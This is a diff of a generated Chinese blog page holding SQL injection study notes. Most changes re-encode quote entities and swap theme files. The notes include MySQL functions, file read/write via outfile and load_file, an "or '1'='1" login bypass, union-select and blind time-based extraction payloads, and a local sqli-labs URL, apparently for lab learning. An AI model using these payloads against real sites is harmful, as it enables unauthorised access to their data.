@@ -14,7 +14,11 @@
     <meta name="screen-orientation" content="portrait">
     <link rel="dns-prefetch" href="http://tea9.xyz">
   	<link rel="stylesheet" href="/css/style.css">
-  	<link rel="stylesheet" href="/css/github-gist.css">
+    <link rel="stylesheet" href="/css/github-gist.css">
+    
+      <link rel="stylesheet" href="/css/prettify.css">
+      <link rel="stylesheet" href="/css/highlight/atelier-savanna-light.min.css">
+    
     <!--SEO-->
 
 <meta name="description" content="心中有光の孩子"/>
@@ -161,23 +165,23 @@ select count(*) from users;
 select count(1) from users;
 
 select concat(username,password) from users;
-select concat_ws(&apos;,&apos;,username,password) from users;
+select concat_ws(&#39;,&#39;,username,password) from users;
 select concat_ws(0x7e,username,password) from users;//~
 select gruop_concat(username) from users;
 
-select &apos;mysql&apos; into outfile &apos;/tmp/mysql&apos;;
-select load_file(&apos;/tmp/mysql&apos;);
+select &#39;mysql&#39; into outfile &#39;/tmp/mysql&#39;;
+select load_file(&#39;/tmp/mysql&#39;);
 
-select ascii(&apos;a&apos;);
-select ord(&apos;adkfjk&apos;); // 字符串第一个字符的ascii
-select mid(&apos;bdkfjk&apos;,1,1); // b 从第一位开始取第一个字符
-select mid(&apos;bdkfjk&apos;,1,1); // bd
-select substr(&apos;bdkfjk&apos;,1,2); //bd
-select substr(&apos;bdkfjk&apos;,1,4); //bdkf
+select ascii(&#39;a&#39;);
+select ord(&#39;adkfjk&#39;); // 字符串第一个字符的ascii
+select mid(&#39;bdkfjk&#39;,1,1); // b 从第一位开始取第一个字符
+select mid(&#39;bdkfjk&#39;,1,1); // bd
+select substr(&#39;bdkfjk&#39;,1,2); //bd
+select substr(&#39;bdkfjk&#39;,1,4); //bdkf
 
-select length(&apos;dfdf&apos;); // 4
+select length(&#39;dfdf&#39;); // 4
 
-select left(&apos;dfdfdf&apos;,2) // df
+select left(&#39;dfdfdf&#39;,2) // df
 select floor(2.4); // 2
 select floor(5.6); // 5
 
@@ -189,8 +193,8 @@ select if(1&lt;2,2,3);
 
 char(97);
 
-select strcmp(&apos;a&apos;,&apos;b&apos;); // -1 对比两个值
-select strcmp(&apos;a&apos;,&apos;a&apos;); // 0
+select strcmp(&#39;a&#39;,&#39;b&#39;); // -1 对比两个值
+select strcmp(&#39;a&#39;,&#39;a&#39;); // 0
 
 select ifnull(null,1);
 select ifnull(2,1);
@@ -239,15 +243,15 @@ select exp(2); // 自然对数e 的几次方
 
 select id,username from users where id between 1 and 4;
 
-select id,username from users where username in (&apos;admin&apos;,&apos;tesdt&apos;);
+select id,username from users where username in (&#39;admin&#39;,&#39;tesdt&#39;);
 
-select id,username from users where username not in (&apos;admin&apos;,&apos;tesdt&apos;);
+select id,username from users where username not in (&#39;admin&#39;,&#39;tesdt&#39;);
 
-select id,username from users where username like &apos;admin&apos;;
+select id,username from users where username like &#39;admin&#39;;
 
-select id,username from users where username like &apos;%ad%&apos;;
+select id,username from users where username like &#39;%ad%&#39;;
 
-select user() regexp &apos;root&apos;;
+select user() regexp &#39;root&#39;;
 </code></pre><h3 id="02-逻辑运算"><a href="#02-逻辑运算" class="headerlink" title="02 逻辑运算"></a>02 逻辑运算</h3><h4 id="逻辑运算符：-AND-OR"><a href="#逻辑运算符：-AND-OR" class="headerlink" title="逻辑运算符： AND  OR"></a>逻辑运算符： AND <--> OR</--></h4><pre><code>select * from users where id=1; // true
 select * from users where id=1 and 1=1; // true
 select * from users where id=1 and 1=2; // false 返回 empty
@@ -256,12 +260,12 @@ select * from users where id=1 or 1=2; // true
 </code></pre><hr>
 <p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/01.jpeg" alt=""></p>
 <pre><code>登录处的SQL语句：
-select * from users where username=&apos;admin&apos; and pwd=&apos;pass&apos;;
-&apos;or &apos;1&apos; = &apos;1
-select * from users where username=&apos;&apos;or &apos;1&apos;=&apos;1&apos; and pwd=&apos;&apos;or &apos;1&apos; = &apos;1&apos;;
+select * from users where username=&#39;admin&#39; and pwd=&#39;pass&#39;;
+&#39;or &#39;1&#39; = &#39;1
+select * from users where username=&#39;&#39;or &#39;1&#39;=&#39;1&#39; and pwd=&#39;&#39;or &#39;1&#39; = &#39;1&#39;;
 </code></pre><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/02.jpeg" alt=""></p>
 <pre><code>and 1=2 union select 1,2,3-- // 1=2 false 执行union后面的语句
-select user() regexp &apos;^ro&apos; // ro开头的用户
+select user() regexp &#39;^ro&#39; // ro开头的用户
 ascii(substr(select user()),1,1)=114 // 用户名为r的用户
 if(ascii(substr((select user(),1,1))=114,0,sleep(5))) // 如果用户名第一个字母是r就返回0，否则睡5秒
 (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=9) 
@@ -288,24 +292,34 @@ http://127.0.0.1/Less-1/?id=1 and 1=2 union select 1,user(),3--+
 
 		<hr />
 <div class="footer">
-	
-        
-            <a href="//github.com/tea9" rel="external nofollow" title="Github" target="_blank">
-		    	<i class="iconfont">&#xeee2;</i>
-		    </a>&nbsp;&nbsp;
-        
-            <a href="/atom.xml" rel="external nofollow" title="RSS" target="_blank">
-		    	<i class="iconfont">&#xe6ee;</i>
-		    </a>&nbsp;&nbsp;
-        
-	
+   
+    
+      <a href="//github.com/tea9" rel="external nofollow" title="Github" target="_blank">
+        <i class="iconfont">&#xeee2;</i> 
+      </a>
+      &nbsp;&nbsp; 
+    
+      <a href="/atom.xml" rel="external nofollow" title="RSS" target="_blank">
+        <i class="iconfont">&#xe6ee;</i> 
+      </a>
+      &nbsp;&nbsp; 
+     
+  
 </div>
 <script src="/js/jquery.min.js"></script>
-<script src="/js/highlight.js"></script>
-<script>hljs.initHighlightingOnLoad();</script>
+ <script src="/js/prettify.js"></script>
+<script type="text/javascript">
+  $(document).ready(function() {
+    $("pre").addClass(
+      "prettyprint linenums"
+    );
+    prettyPrint();
+  });
+</script>
+
 
 		<div class="copyright">
-	Copyright &copy; 2019 . 没有备案<br />Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>&nbsp;&nbsp;&sdot;&nbsp;&nbsp;Theme is <a href="https://github.com/praming/hexo-theme-Ice" target="_blank">Ice</a>&nbsp;&nbsp;&sdot;&nbsp;&nbsp;Hosted by <a href="https://pages.coding.me">Coding Pages</a>
+	Copyright &copy; 2019 . <a href="/v1">v1</a> . <a href="/v2">v2</a><br />Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>&nbsp;&nbsp;&sdot;&nbsp;&nbsp;Theme is <a href="https://github.com/praming/hexo-theme-Ice" target="_blank">Ice</a>
 </div>
   <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":200,"height":350},"mobile":{"show":true},"log":false});</script></body>
 </html>
